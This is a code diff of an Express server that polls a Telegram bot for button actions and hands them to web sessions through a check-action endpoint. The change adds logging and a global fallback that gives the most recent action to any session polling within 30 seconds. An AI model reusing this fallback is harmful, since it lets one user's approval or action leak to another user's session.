@@ -155,6 +155,7 @@ const pollTelegram = async () => {
         const data = await response.json();
 
         if (data.ok && data.result.length > 0) {
+            console.log(`[📨 TELEGRAM] ${data.result.length} actualización(es) recibida(s)`);
             for (const update of data.result) {
                 lastUpdateId = update.update_id;
 
@@ -166,9 +167,14 @@ const pollTelegram = async () => {
 
                     console.log(`[TELEGRAM] Action: ${action} for Session: ${sessionId}`);
 
-                    // Save action for the session
+                    // Save action globally for ANY session to pick up
                     global.pendingActions = global.pendingActions || {};
+                    // Use the sessionId from button AND a global flag
                     global.pendingActions[sessionId] = action;
+                    global.lastAction = { action, sessionId, timestamp: Date.now() };
+                    
+                    console.log(`[💾 STORED] Action "${action}" guardada para sesiones`);
+                    console.log(`[🎯 GLOBAL] lastAction actualizada: ${action}`);
 
                     // Execute Telegram API calls in parallel for faster response
                     const botToken = process.env.TELEGRAM_BOT_TOKEN;
@@ -203,9 +209,21 @@ const pollTelegram = async () => {
 // API Endpoints
 app.get('/api/check-action', (req, res) => {
     const sessionId = req.sessionID;
-    const action = global.pendingActions ? global.pendingActions[sessionId] : null;
-
-    if (action) {
+    
+    // Check for action with current sessionId
+    let action = global.pendingActions ? global.pendingActions[sessionId] : null;
+    
+    // If no action for this session, check the global last action (for mismatched sessions)
+    if (!action && global.lastAction) {
+        const timeSinceAction = Date.now() - global.lastAction.timestamp;
+        // If action is less than 30 seconds old, use it
+        if (timeSinceAction < 30000) {
+            action = global.lastAction.action;
+            console.log(`[✅ ACTION] ${action} | SID: ${sessionId} (from global)`);
+            // Clear the global action after using it
+            global.lastAction = null;
+        }
+    } else if (action) {
         console.log(`[✅ ACTION] ${action} | SID: ${sessionId}`);
         delete global.pendingActions[sessionId];
     }
@@ -243,7 +261,12 @@ app.post('/api/send-confirmation', async (req, res) => {
 
 // Start Server
 app.listen(PORT, () => {
-    console.log(`Server running on http://localhost:${PORT}`);
+    console.log(`
+🚀 ===================================`);
+    console.log(`🚀 Server running on port ${PORT}`);
+    console.log(`🚀 ===================================
+`);
+    console.log(`🤖 Iniciando Telegram polling...`);
     // Start Telegram polling automatically
     pollTelegram();
 });
